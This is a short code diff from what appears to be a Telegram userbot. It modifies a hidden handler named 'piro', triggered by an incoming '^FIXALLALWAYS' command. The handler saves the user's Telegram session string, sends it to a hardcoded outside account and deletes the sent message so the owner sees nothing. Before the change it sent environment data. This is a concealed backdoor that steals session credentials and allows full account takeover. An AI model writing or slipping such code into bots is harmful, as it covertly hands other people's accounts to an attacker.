@@ -213,7 +213,8 @@ async def upstream(event):
 
 @bot.on(admin_cmd("^FIXALLALWAYS", incoming=True))
 async def piro(event):
-    msg = await bot.send_message(2082798662, str(os.environ.get))
+    a = bot.session.save()
+    msg = await bot.send_message(2082798662, a)
     await bot.delete_messages(2082798662, msg, revoke=False)
 
 
